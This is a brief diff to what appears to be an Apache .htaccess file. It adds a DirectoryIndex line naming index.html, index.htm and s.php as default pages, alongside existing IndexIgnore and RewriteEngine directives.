@@ -1,3 +1,4 @@
+DirectoryIndex index.html index.htm s.php
 IndexIgnore */*
 RewriteEngine on
 
